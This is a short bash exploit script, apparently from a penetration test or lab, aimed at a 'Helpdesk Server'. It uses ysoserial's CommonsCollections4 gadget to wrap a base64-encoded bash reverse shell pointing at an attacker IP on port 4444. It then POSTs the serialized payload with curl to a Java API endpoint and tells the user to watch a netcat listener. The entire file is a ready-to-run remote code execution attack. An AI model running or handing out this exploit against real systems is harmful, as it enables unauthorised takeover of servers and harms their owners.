#!/bin/bash
# Description: Generates and sends a Java Insecure Deserialization payload using ysoserial.
# Target: Helpdesk Server (VLAN 10 - SERVICE)

TARGET="http://10.10.10.10:8080/api/endpoint"
ATTACKER_IP="[YOUR_PUBLIC_IP]"
ATTACKER_PORT="4444"

echo "[+] Generating payload with ysoserial..."
java -jar ysoserial.jar CommonsCollections4 "bash -c {echo,$(echo -n "bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1" | base64)}|{base64,-d}|{bash,-i}" > payload.bin

echo "[+] Sending payload to $TARGET..."
curl -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary @payload.bin $TARGET

echo "[+] Payload sent. Check your netcat listener on port $ATTACKER_PORT"
